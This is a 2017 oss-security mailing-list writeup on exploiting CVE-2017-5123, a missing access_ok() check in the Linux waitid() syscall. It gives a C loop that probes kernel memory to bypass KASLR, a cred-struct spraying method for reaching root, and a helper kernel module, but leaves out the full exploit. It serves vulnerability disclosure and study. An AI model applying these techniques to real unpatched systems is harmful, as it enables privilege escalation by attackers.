@@ -1,0 +1,401 @@
+
+Date: Tue, 07 Nov 2017 02:38:03 +0100
+From: up201407890@...nos.dcc.fc.up.pt
+To: up201407890@...nos.dcc.fc.up.pt
+Cc: oss-security@...ts.openwall.com
+Subject: Re: Re: CVE-2017-5123 Linux kernel v4.13 waitid()
+	not calling access_ok()
+
+This will be a fast writeup on how I exploited CVE-2017-5123, a Linux  
+kernel vulnerability in the waitid() syscall for 4.12-4.13, which  
+gives an attacker a "write-not-what-only-where" primitive, or in other  
+words, the ability to write "non-controlled" user data to arbitrary  
+kernel memory.
+KASLR is bypassed using memory probing and root obtained via cred  
+struct spraying and location predictability.
+
+The video demonstrating my exploit in action was published on November  
+5th, as it can be seen here:
+
+https://www.youtube.com/watch?v=DfwOJIcV5ZA
+
+
+Surprisingly, Chris Salls independently published his own writeup and  
+exploit on November 6th. Awesome work there!
+https://salls.github.io/Linux-Kernel-CVE-2017-5123/
+
+So now, November 7th (0:30 a.m here in Portugal!), I'll be detailing  
+how I used this "write-not-what-only-where" vulnerability without a  
+single read to get root.
+
+Obviously, given other vulnerabilities, such as certain infoleaks, it  
+would be an instant game over.
+
+What spiked some interest to me, was what could one actually do with  
+only this vulnerability by itself, or other vulnerabilities of this  
+type, assuming all vanilla kernel protections.
+It's powerful, but some would initially assume that it's not enough to  
+increase our privileges these days.
+
+
+
+
+
+The vulnerability:
+
+from kernel/exit.c:
+
+SYSCALL_DEFINE5(waitid, int, which, pid_t, upid, struct siginfo __user *,
+                                   infop, int, options, struct rusage  
+__user *, ru)
+{
+     struct rusage r;
+     struct waitid_info info = {.status = 0};
+     long err = kernel_waitid(which, upid, &info, options, ru ? &r : NULL);
+     int signo = 0;
+
+     if (err > 0) {
+         signo = SIGCHLD;
+         err = 0;
+         if (ru && copy_to_user(ru, &r, sizeof(struct rusage)))
+             return -EFAULT;
+         }
+         if (!infop)
+             return err;
+
+         user_access_begin();
+         unsafe_put_user(signo, &infop->si_signo, Efault);
+         unsafe_put_user(0, &infop->si_errno, Efault);
+         unsafe_put_user(info.cause, &infop->si_code, Efault);
+         unsafe_put_user(info.pid, &infop->si_pid, Efault);
+         unsafe_put_user(info.uid, &infop->si_uid, Efault);
+         unsafe_put_user(info.status, &infop->si_status, Efault);
+         user_access_end();
+         return err;
+Efault:
+         user_access_end();
+         return -EFAULT;
+}
+
+
+The vulnerability here is that there's a missing access_ok() check in  
+the waitid() syscall since they've introduced unsafe_put_user() in 4.12.
+The macro access_ok() should basically ensure that the user specified  
+ptr points to user space and not kernel space, since unprivileged  
+users shouldn't be able to write arbitrarily to kernel memory.
+This is done by checking the address limit.
+
+from arch/x86/include/asm/uaccess.h
+
+#define user_addr_max() (current->thread.addr_limit.seg)
+
+...
+
+/*
+  * Test whether a block of memory is a valid user space address.
+  * Returns 0 if the range is valid, nonzero otherwise.
+  */
+static inline bool __chk_range_not_ok(unsigned long addr, unsigned  
+long size, unsigned long limit)
+{
+	/*
+	 * If we have used "sizeof()" for the size,
+	 * we know it won't overflow the limit (but
+	 * it might overflow the 'addr', so it's
+	 * important to subtract the size from the
+	 * limit, not add it to the address).
+	 */
+	if (__builtin_constant_p(size))
+		return unlikely(addr > limit - size);
+
+	/* Arbitrary sizes? Be careful about overflow */
+	addr += size;
+	if (unlikely(addr < size))
+		return true;
+	return unlikely(addr > limit);
+}
+
+#define __range_not_ok(addr, size, limit)				\
+({									\
+	__chk_user_ptr(addr);						\
+	__chk_range_not_ok((unsigned long __force)(addr), size, limit); \
+})
+
+...
+
+#define access_ok(type, addr, size)					\
+({									\
+	WARN_ON_IN_IRQ();						\
+	likely(!__range_not_ok(addr, size, user_addr_max()));		\
+})
+
+
+
+This means that this vulnerability allows an unprivileged user to  
+specify a kernel address by using infop when calling waitid(), and the  
+kernel will happily write to it.
+What is actually written though is hardly controlled.
+ From Chris' post: "info.status is a 32 bit int, but constrained to be  
+0 < status < 256. info.pid can be somewhat controlled by repeatedly  
+forking, but has a max value of 0x8000."
+
+This, however, did not interest me. What interested me was that we  
+could write 0's into arbitrary kernel memory.
+Here's what differentiates my exploit from Chris' - If we could  
+somehow find our cred's structure, we could write 0's there to  
+effectively get root privileges by overwriting cred->euid and cred->uid.
+
+from include/linux/cred.h:
+
+struct cred {
+	atomic_t	usage;
+#ifdef CONFIG_DEBUG_CREDENTIALS
+	atomic_t	subscribers;	/* number of processes subscribed */
+	void		*put_addr;
+	unsigned	magic;
+#define CRED_MAGIC	0x43736564
+#define CRED_MAGIC_DEAD	0x44656144
+#endif
+	kuid_t		uid;		/* real UID of the task */
+	kgid_t		gid;		/* real GID of the task */
+	kuid_t		suid;		/* saved UID of the task */
+	kgid_t		sgid;		/* saved GID of the task */
+	kuid_t		euid;		/* effective UID of the task */
+	kgid_t		egid;		/* effective GID of the task */
+	kuid_t		fsuid;		/* UID for VFS ops */
+	kgid_t		fsgid;		/* GID for VFS ops */
+	unsigned	securebits;	/* SUID-less security management */
+	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
+	kernel_cap_t	cap_permitted;	/* caps we're permitted */
+	kernel_cap_t	cap_effective;	/* caps we can actually use */
+	kernel_cap_t	cap_bset;	/* capability bounding set */
+	kernel_cap_t	cap_ambient;	/* Ambient capability set */
+#ifdef CONFIG_KEYS
+	unsigned char	jit_keyring;	/* default keyring to attach requested
+					 * keys to */
+	struct key __rcu *session_keyring; /* keyring inherited over fork */
+	struct key	*process_keyring; /* keyring private to this process */
+	struct key	*thread_keyring; /* keyring private to this thread */
+	struct key	*request_key_auth; /* assumed request_key authority */
+#endif
+#ifdef CONFIG_SECURITY
+	void		*security;	/* subjective LSM security */
+#endif
+	struct user_struct *user;	/* real user ID subscription */
+	struct user_namespace *user_ns; /* user_ns the caps and keyrings are  
+relative to. */
+	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
+	struct rcu_head	rcu;		/* RCU deletion hook */
+};
+
+
+At this point we are completely blind though, we need a way to bypass  
+KASLR and find the kernel heap.
+
+
+
+
+
+KASLR bypass via memory probing:
+
+By using functions such as copy_from_user/copy_to_user, etc., we make  
+sure that a kernel OOPS won't happen when a bad address is specified  
+via page fault exception handler.
+This makes sense, since unprivileged users shouldn't be able to cause  
+a DoS whenever they present an address that does not belong to the  
+address space of the user space process.
+The same happens by using unsafe_put_user(), which means that we can  
+do some memory probing on the range of possible locations for the  
+kernel heap!
+I do this by using something along the lines of:
+
+for(i = (char *)0xffff880000000000; ; i+=0x10000000) {
+	pid = fork();
+	if (pid > 0) {
+		if(syscall(__NR_waitid, P_PID, pid, (siginfo_t *)i, WEXITED, NULL) >= 0) {
+			printf("[+] Found %p\n", i);
+			break;
+		}
+	}
+	else if (pid == 0)
+		exit(0);
+}
+
+The trick here is that waitid() won't return -EFAULT when we present  
+it a valid address, so we can do some memory probing this way.
+Thanks for the enlightenment spender, not the exploits (well actually  
+those were pretty cool at the time) :)
+
+Now that we know where the kernel heap lives, how do we know where our  
+cred's structure live? The state of the kernel heap is pretty much  
+unknown.
+
+
+
+
+
+Heap Spraying:
+
+At this point I already had a clear idea of what I wanted/needed.
+If we create hundreds or thousands of processes, hundreds or thousands  
+of cred structures will be created in the kernel heap.
+So my idea was to create these many processes that will check in a  
+loop if they get euid of 0, by constantly calling geteuid.
+If geteuid returns 0, it means that we have hit the jackpot! From  
+there, we can also write to cred->euid - 0x10, which is cred->uid.
+
+By spraying the heap we higher the probability of hitting our target,  
+but it is obviously not 100% reliable, just like Chris mentions in his  
+heap spray.
+Given the primitive we have, heap spraying obviously helps here :)
+
+When spraying the heap with multiple struct cred's and observed their  
+location, I noticed that some addresses are more likely than others to  
+where the creds will reside.
+This can be observed without the need for some kernel debugging if one  
+wants to try it out easily, simply use this kernel module which prints  
+where cred->euid lives.
+
+
+
+#include <linux/module.h>
+#include <linux/init.h>
+#include <linux/kernel.h>
+#include <linux/sched.h>
+#include <linux/fs.h>		// for basic filesystem
+#include <linux/proc_fs.h>	// for the proc filesystem
+#include <linux/seq_file.h>	// for sequence files
+
+static struct proc_dir_entry* jif_file;
+
+static int
+jif_show(struct seq_file *m, void *v)
+{
+	return 0;
+}
+
+static int
+jif_open(struct inode *inode, struct file *file)
+{
+      printk("EUID: %p\n", &current->cred->euid);
+      return single_open(file, jif_show, NULL);
+}
+
+static const struct file_operations jif_fops = {
+     .owner	= THIS_MODULE,
+     .open	= jif_open,
+     .read	= seq_read,
+     .llseek	= seq_lseek,
+     .release	= single_release,
+};
+
+static int __init
+jif_init(void)
+{
+     jif_file = proc_create("jif", 0, NULL, &jif_fops);
+
+     if (!jif_file) {
+         return -ENOMEM;
+     }
+
+     return 0;
+}
+
+static void __exit
+jif_exit(void)
+{
+     remove_proc_entry("jif", NULL);
+}
+
+module_init(jif_init);
+module_exit(jif_exit);
+
+MODULE_LICENSE("GPL");
+
+
+By forking() and opening /proc/jif repeatedly, we can later check the  
+output of printk using dmesg.
+
+# dmesg | grep EUID\:
+
+[16485.192353] EUID: ffff88015e909a14
+[16485.192415] EUID: ffff88015e9097d4
+[16485.192475] EUID: ffff88015e909954
+[16485.192537] EUID: ffff880126c627d4
+[16485.192599] EUID: ffff88015e9094d4
+[16485.192660] EUID: ffff88015e909414
+[16485.192725] EUID: ffff88015e909294
+[16485.192790] EUID: ffff88015e909054
+[16485.192860] EUID: ffff8801358efdd4
+[16485.192925] EUID: ffff8801358efd14
+[16485.192991] EUID: ffff8801358efe94
+[16485.193057] EUID: ffff88015e909354
+[16485.193124] EUID: ffff88015e9091d4
+[16485.193187] EUID: ffff8801358eff54
+[16485.193249] EUID: ffff8801358efb94
+[16485.193314] EUID: ffff8801358efa14
+[16485.193381] EUID: ffff88015e909114
+[16485.193449] EUID: ffff8801358ef894
+[16485.193515] EUID: ffff8801358ef714
+[16485.234054] EUID: ffff880125766d14
+[16485.234150] EUID: ffff8801256e9954
+[16485.234189] EUID: ffff8801256e9654
+[16485.429875] EUID: ffff8801257661d4
+[16485.429881] EUID: ffff8801256e9e94
+[16485.603481] EUID: ffff8801358ef954
+[16485.603543] EUID: ffff8801256e9b94
+[16485.603582] EUID: ffff880126c62e94
+[16485.603620] EUID: ffff8801358ef7d4
+[16485.603658] EUID: ffff880126c62a14
+[16485.603701] EUID: ffff880125766654
+[16485.603743] EUID: ffff8801358ef654
+[16485.603782] EUID: ffff8801257667d4
+[16485.603824] EUID: ffff880125766a14
+[16485.603864] EUID: ffff880125766b94
+[16485.603906] EUID: ffff8801256e94d4
+[16485.603943] EUID: ffff8801256e91d4
+[16485.603979] EUID: ffff880126c62d14
+[16485.604017] EUID: ffff88015e909654
+
+[...]
+
+We can kind of guess where they might be located, but obviously it's  
+just guessing :)
+So now we know that at heap base + some offset, the probability of  
+hitting our target is kind of high compared to the rest.
+And so I start writing to these and adding PAGESIZE in hope that we  
+overwrite one of these processes' credentials.
+If that happens, we win!
+
+
+
+
+
+The exploit:
+
+If you've read everything all the way down here, then I'm sure you can  
+write your own... It's not that hard!
+I've provided you with all the necessary information on how I  
+exploited it. If I can, you can too. :)
+
+
+
+
+Conclusion:
+
+You've now seen that a vulnerability of this type, by itself, can  
+still be dangerous when exploiting the Linux kernel.
+Thanks again spender, André Baptista (@0xACB), and all xSTF.
+Shout-out to .pt :)
+
+
+Happy Hacking!
+
+https://twitter.com/uid1000
+
+Thanks,
+Federico Bento.
+
+----------------------------------------------------------------
+This message was sent using IMP, the Internet Messaging Program.
+
